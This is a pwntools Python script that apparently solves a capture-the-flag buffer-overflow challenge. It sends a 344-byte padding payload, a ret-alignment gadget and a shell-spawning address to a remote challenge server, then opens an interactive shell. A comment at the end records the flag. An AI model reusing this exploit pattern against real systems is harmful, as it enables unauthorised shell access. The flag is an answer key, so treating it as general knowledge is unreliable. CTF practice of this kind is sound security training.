from pwn import *

exe = ELF("pw_gen")
context.binary = exe
p = remote("securepw.challs.cyberchallenge.it", 6021)

retq = 0x400626  # address used to align the RBP register
system = 0x004007a7  # address of function used to spawn a shell
log.success("retq address --> %s" % retq)
log.success("system address --> %s" % system)
p.sendlineafter("password: ", b'A' * 344 + p64(retq) + p64(system))  # sending the payload to the server

p.interactive()

# FLAG --> CCIT{4_teXtb00K_B0F}
